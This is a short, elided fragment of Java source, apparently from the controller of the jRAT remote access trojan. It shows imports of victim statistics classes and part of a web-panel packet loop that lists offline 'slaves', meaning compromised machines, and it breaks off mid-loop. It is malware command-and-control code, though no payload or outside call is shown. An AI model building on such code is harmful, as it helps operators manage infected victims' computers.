...
import jrat.controller.settings.StatisticsCountry.CountryStatEntry;
import jrat.controller.settings.StatisticsOperatingSystem;
import jrat.controller.settings.StatisticsOperatingSystem.OperatingSystemStatEntry;
            ...
            while ((packet = readNumber()) != -1) {
            	if (packet == WebPanelPackets.PACKET_LIST) {
                	...
                	for (AbstractSlave as : StoreOfflineSlaves.getGlobal().getList()) {
						OfflineSlave os = (OfflineSlave) as;
                		if (!os.isOnline()) {
